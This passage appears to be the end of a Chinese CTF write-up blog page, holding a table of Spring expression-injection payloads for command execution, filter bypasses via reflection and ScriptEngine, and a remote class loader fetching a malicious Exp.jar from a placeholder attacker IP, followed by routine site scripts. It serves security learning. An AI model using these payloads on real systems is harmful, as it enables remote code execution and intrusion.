+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;cat /app/flag*&quot;&#125;).start().getInputStream(), &quot;gbk&quot;)).readLine()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>以下是常见的payload：</p>
+<table>
+<thead>
+<tr>
+<th><strong>战术分类</strong></th>
+<th><strong>适用场景 / 描述</strong></th>
+<th><strong>Payload 核心代码 (需自行包裹 ${} 或 #{})</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>基础直打 (无回显)</strong></td>
+<td>没有任何过滤，最简单粗暴的弹计算器/盲打执行。</td>
+<td><code>new java.lang.ProcessBuilder(new String[]{&quot;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;}).start()</code></td>
+</tr>
+<tr>
+<td><strong>基础直打 (无回显)</strong></td>
+<td>经典的 Runtime 盲打。</td>
+<td><code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>自带回显 (读单行)</strong></td>
+<td><strong>强烈推荐！</strong> 解决无回显问题，直接在网页返回执行结果的第一行。</td>
+<td><code>new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(new String[]{&quot;bash&quot;,&quot;-c&quot;,&quot;whoami&quot;}).start().getInputStream(),&quot;utf-8&quot;)).readLine()</code></td>
+</tr>
+<tr>
+<td><strong>引擎曲线救国</strong></td>
+<td>过滤了 <code>ProcessBuilder</code> 和 <code>Runtime</code>，但放过了 <code>ScriptEngine</code>。</td>
+<td><code>new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(&quot;s=[3];s[0]=&#39;bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;whoami&#39;;java.lang.Runtime.getRuntime().exec(s);&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>反射绕过 <code>T()</code></strong></td>
+<td>过滤了 <code>T</code> 关键字，利用系统类加载器把 <code>Runtime</code> 捞出来。</td>
+<td><code>T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>隐身绕过 <code>T()</code></strong></td>
+<td>Web 环境极力推荐！利用 HTTP 请求自带的 <code>request</code> 对象的类加载器，完美避开黑名单。</td>
+<td><code>#request.getClass().getClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null).exec(&quot;whoami&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>远程加载 (出网)</strong></td>
+<td>服务器必须能访问外网。加载你公网服务器上编译好的恶意 <code>Exp.jar</code>。</td>
+<td><code>new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(&quot;http://你的IP/Exp.jar&quot;)}).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;参数&quot;)</code></td>
+</tr>
+<tr>
+<td><strong>无字母/引号绕过</strong></td>
+<td>所有的引号都被过滤了，利用 ASCII 码强行拼出命令 (以拼凑 <code>ls</code> 为例)。</td>
+<td><code>T(java.lang.Runtime).getRuntime().exec(T(Character).toString(108).concat(T(Character).toString(115)))</code></td>
+</tr>
+</tbody></table>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/">各版本绕过_wakeup()</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Yu9991n9</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-htaccess"><span class="toc-text">上传(.htaccess)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-text">php是世界上最好的语言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E5%B8%B8%E5%A5%BD%E7%BB%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">非常好绕的命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%8A%E4%BC%A0%EF%BC%88Linux%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-text">这又是一个上传（Linux提权）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-text">网站被黑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#usr-local-lib-python3-5-site-packages-flask-app-py"><span class="toc-text">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#very-php"><span class="toc-text">very php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%92%E9%B8%A1%E6%B1%A4"><span class="toc-text">毒鸡汤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unserialize-Escape"><span class="toc-text">Unserialize_Escape</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E7%94%B1%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8A%E4%BC%A0-script%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">自由的文件的上传(script短标签绕过上传一句话木马)</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
